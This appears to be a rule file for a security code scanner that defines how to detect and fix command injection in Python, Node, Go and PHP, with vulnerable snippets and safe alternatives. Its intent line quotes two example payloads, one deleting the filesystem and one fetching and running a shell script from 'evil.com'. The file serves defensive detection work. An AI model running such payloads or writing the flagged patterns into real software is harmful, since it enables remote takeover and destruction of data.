---
id: COMMAND-INJECTION
severity_max: CRITICAL
applies_to: all
---

# Command Injection

## Intent

User input passed to shell without escaping → attacker adds `; rm -rf /` or `$(curl evil.com/shell.sh | sh)`. Direct RCE — full server takeover.

## Search patterns

- `os.system("convert " + filename)`
- `subprocess.run("ls " + user_path, shell=True)`
- `child_process.exec("ffmpeg -i " + inputFile)`
- `exec.Command("sh", "-c", "ls " + userPath)` (Go)
- `shell_exec("convert " . $_FILES['img']['name'])` (PHP)

## L1-L4 reasoning

User-controlled input = L1. Flag if L1 reaches shell execution without escaping. If args passed as array (no shell) → NOT a finding.

## Fix

- Avoid shell — use language-native APIs or args as array
- Python: `subprocess.run(['convert', filename], shell=False)`
- Node: `spawn('ffmpeg', ['-i', inputFile])` (not `exec`)
- Go: `exec.Command("ls", userPath)` (variadic, not `-c` string)
- If shell unavoidable: `shlex.quote()` (Python), `shellescape` lib

## Related rules

`08-insecure-deserialization` (same RCE family), `10-path-traversal`
